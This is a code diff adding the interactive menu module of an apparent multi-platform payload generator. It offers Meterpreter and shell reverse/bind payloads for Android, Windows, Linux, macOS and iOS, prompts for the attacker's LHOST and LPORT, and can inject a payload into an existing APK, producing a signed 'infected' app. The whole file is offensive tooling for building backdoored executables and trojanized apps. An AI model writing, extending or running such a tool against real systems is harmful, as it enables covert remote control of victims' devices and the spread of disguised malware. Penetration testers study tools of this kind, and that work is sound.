@@ -1,0 +1,250 @@
+# Developer: Sreeraj
+# GitHub: https://github.com/s-r-e-e-r-a-j
+
+from .banner import show
+from .utils import ask, info, warn, fail, validate_ip, validate_port, clear
+from .deps import check_required, check_android_tools, auto_install
+from .payload import generate, android_sign
+import time
+
+
+def main_loop() -> None:
+    clear()
+    show()
+    auto = False
+    if ask('Enable automatic install of missing packages? (y/N): ').strip().lower() == 'y':
+        auto = True
+    basic = check_required()
+    android = check_android_tools()
+    missing = [k for k, v in {**basic, **android}.items() if not v]
+    if missing:
+        ok, installed = auto_install(missing, auto=auto)
+        if not ok:
+            warn('Some tools still missing; Android flows may fail')
+        else:
+             clear()
+             show()
+    else:
+         clear()
+         show()
+    while True:
+        print('')
+        print('[1] Android -> Normal APK')
+        print('[2] Android -> Inject into original APK')
+        print('[3] Windows payload')
+        print('[4] Linux payload')
+        print('[5] macOS payload')
+        print('[6] iOS payload')
+        print('[7] Re-check dependencies')
+        print('[8] Exit')
+        sel = ask('Select: ').strip()
+        if sel == '1':
+            android_normal()
+        elif sel == '2':
+            android_inject()
+        elif sel == '3':
+            pick_windows_payload()
+        elif sel == '4':
+            pick_linux_payload()
+        elif sel == '5':
+            pick_macos_payload()
+        elif sel == '6':
+            pick_ios_payload()
+        elif sel == '7':
+            basic = check_required()
+            android = check_android_tools()
+        elif sel == '8':
+            info('Exiting')
+            time.sleep(0.3)
+            break
+        else:
+            warn('Invalid option')
+
+
+def pick_android_payload() -> str:
+    print('[1] android/meterpreter/reverse_tcp')
+    print('[2] android/meterpreter/reverse_http')
+    print('[3] android/meterpreter/reverse_https')
+    p = ask('Choose: ').strip()
+    if p == '2':
+        return 'android_http'
+    if p == '3':
+        return 'android_https'
+    return 'android_tcp'
+
+def pick_windows_payload() -> None:
+    clear()
+    show()
+    print('[1] windows/meterpreter/reverse_tcp')
+    print('[2] windows/meterpreter/reverse_https')
+    print('[3] windows/meterpreter/bind_tcp') 
+    print('[4] windows/shell/reverse_tcp')
+    print('[5] windows/shell/bind_tcp')
+    p = ask('choose: ').strip()
+    if p == '1':
+       simple_flow('windows_reverse_tcp')
+    elif p == '2':
+        simple_flow('windows_reverse_https')
+    elif p == '3':
+        simple_flow('windows_bind_tcp')
+    elif p == '4':
+        simple_flow('windows_shell_reverse_tcp')
+    elif p == '5':
+        simple_flow('windows_shell_bind_tcp')
+    else:
+         warn('Invalid choice.')
+
+def pick_linux_payload() -> None:
+    clear()
+    show()
+    print('[1]  linux/x86/meterpreter_reverse_http')
+    print('[2]  linux/x86/meterpreter_reverse_https')
+    print('[3]  linux/x86/meterpreter/reverse_tcp')
+    print('[4]  linux/x64/meterpreter_reverse_http')
+    print('[5]  linux/x64/meterpreter_reverse_https')
+    print('[6]  linux/x64/meterpreter/reverse_tcp')
+    print('[7]  linux/x86/shell/reverse_tcp')
+    print('[8]  linux/x64/shell/bind_tcp')
+    print('[9]  linux/x86/meterpreter/bind_tcp')
+    print('[10] linux/x64/meterpreter/bind_tcp')
+    print('[11] linux/x86/shell/bind_tcp')
+    print('[12] linux/x64/shell/reverse_tcp')
+    p = ask('choose: ').strip()
+
+    if p == '1':
+        simple_flow('linux_x86_meterpreter_reverse_http')
+    elif p == '2':
+        simple_flow('linux_x86_meterpreter_reverse_https')
+    elif p == '3':
+        simple_flow('linux_x86_meterpreter_reverse_tcp')
+    elif p == '4':
+        simple_flow('linux_x64_meterpreter_reverse_http')
+    elif p == '5':
+        simple_flow('linux_x64_meterpreter_reverse_https')
+    elif p == '6':
+        simple_flow('linux_x64_meterpreter_reverse_tcp')
+    elif p == '7':
+        simple_flow('linux_x86_shell_reverse_tcp')
+    elif p == '8':
+        simple_flow('linux_x64_shell_bind_tcp')
+    elif p == '9':
+        simple_flow('linux_x86_meterpreter_bind_tcp')
+    elif p == '10':
+        simple_flow('linux_x64_meterpreter_bind_tcp')
+    elif p == '11':
+        simple_flow('linux_x86_shell_bind_tcp')
+    elif p == '12':
+        simple_flow('linux_x64_shell_reverse_tcp')
+    else:
+        warn('Invalid choice.')
+
+def pick_macos_payload() -> None:
+    clear()
+    show()
+    print('[1] osx/x86/shell_reverse_tcp')
+    print('[2] osx/x86/shell_bind_tcp')
+    print('[3] osx/x64/meterpreter/bind_tcp')
+    print('[4] osx/x64/meterpreter/reverse_tcp')
+    print('[5] osx/x64/meterpreter_reverse_http')
+    print('[6] osx/x64/meterpreter_reverse_https')
+    p = ask('choose: ').strip()
+    if p == '1':
+       simple_flow('macos_x86_shell_reverse_tcp')
+    elif p == '2':
+        simple_flow('macos_x86_shell_bind_tcp')
+    elif p == '3':
+        simple_flow('macos_x64_meterpreter_bind_tcp')
+    elif p == '4':
+        simple_flow('macos_x64_meterpreter_reverse_tcp')
+    elif p == '5':
+        simple_flow('macos_x64_meterpreter_reverse_http')
+    elif p == '6':
+        simple_flow('macos_x64_meterpreter_reverse_https')
+    else:
+        warn('Invalid choice.')
+
+def pick_ios_payload() -> None:
+    clear()
+    show()
+    print('[1] apple_ios/aarch64/meterpreter_reverse_http')
+    print('[2] apple_ios/aarch64/meterpreter_reverse_https')
+    print('[3] apple_ios/aarch64/meterpreter_reverse_tcp')
+    print('[4] apple_ios/aarch64/shell_reverse_tcp')
+    print('[5] apple_ios/armle/meterpreter_reverse_http')
+    print('[6] apple_ios/armle/meterpreter_reverse_https')
+    print('[7] apple_ios/armle/meterpreter_reverse_tcp')
+    p = ask('choose: ').strip()
+    if p == '1':
+       simple_flow('ios_aarch64_meterpreter_reverse_http')
+    elif p == '2':
+        simple_flow('ios_aarch64_meterpreter_reverse_https')
+    elif p == '3':
+        simple_flow('ios_aarch64_meterpreter_reverse_tcp')
+    elif p == '4':
+        simple_flow('ios_aarch64_shell_reverse_tcp')
+    elif p == '5':
+        simple_flow('ios_armle_meterpreter_reverse_http')
+    elif p == '6':
+        simple_flow('ios_armle_meterpreter_reverse_https')
+    elif p == '7':
+        simple_flow('ios_armle_meterpreter_reverse_tcp')
+    else:
+        warn('Invalid choice')
+
+def android_normal() -> None:
+    clear()
+    show()
+    key = pick_android_payload()
+    lhost = ask('LHOST: ').strip()
+    if not validate_ip(lhost):
+        fail('Invalid IP')
+        return
+    lport = ask('LPORT: ').strip()
+    if not validate_port(lport):
+        fail('Invalid port')
+        return
+    out = ask('Output apk (example: /path/to/payloadname.apk): ').strip()
+    dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
+    ok = generate(key, lhost, int(lport), out, dry=dry)
+    if ok and not dry:
+        if ask('Sign & zipalign? (y/N): ').strip().lower() == 'y':
+            final = ask('Final name (/path/to/final.apk): ').strip()
+            android_sign(out, final)
+
+
+def android_inject() -> None:
+    clear()
+    show()
+    key = pick_android_payload()
+    lhost = ask('LHOST: ').strip()
+    if not validate_ip(lhost):
+        fail('Invalid IP')
+        return
+    lport = ask('LPORT: ').strip()
+    if not validate_port(lport):
+        fail('Invalid port')
+        return
+    org = ask('Path to original APK: ').strip()
+    out = ask('Output apk (example: /path/to/infected.apk): ').strip()
+    dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
+    ok = generate(key, lhost, int(lport), out, infile=org, dry=dry)
+    if ok and not dry:
+        if ask('Sign & zipalign? (y/N): ').strip().lower() == 'y':
+            final = ask('Final name (/path/to/final.apk): ').strip()
+            android_sign(out, final)
+
+
+def simple_flow(kind: str) -> None:
+    clear()
+    show()
+    lhost = ask('LHOST: ').strip()
+    if not validate_ip(lhost):
+        fail('Invalid IP')
+        return
+    lport = ask('LPORT: ').strip()
+    if not validate_port(lport):
+        fail('Invalid port')
+        return
+    out = ask('Output filename [example:/path/to/payloadname.extension] (Extensions:- linux:.elf, windows:.exe, macOS/iOS:.macho): ').strip()
+    dry = ask('Dry run? (y/N): ').strip().lower() == 'y'
+    generate(kind, lhost, int(lport), out, dry=dry)
